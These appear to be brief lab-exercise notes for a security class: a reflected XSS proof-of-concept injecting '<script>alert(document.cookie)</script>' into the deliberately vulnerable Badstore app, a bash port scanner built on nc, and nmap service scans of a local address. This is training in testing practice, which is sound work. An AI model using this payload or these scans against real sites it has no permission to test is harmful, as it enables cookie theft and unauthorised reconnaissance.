5a Badstore
<script>alert(document.cookie)</script>

5b
nano port_scan.sh
inside
#!/bin/bash
host="www.example.com"
read -p "Enter the starting port number: " start_port
read -p "Enter the ending port number: " end_port
for ((port=start_port; port<=end_port; port++))
do
    echo "Scanning port $port..."
    nc -zv -w1 "$host" "$port" 2>&1
done
chmod +x port_scan.sh
./port_scan.sh

5c 
nmap 127.0.1.1

nmap -sV 127.0.1.1
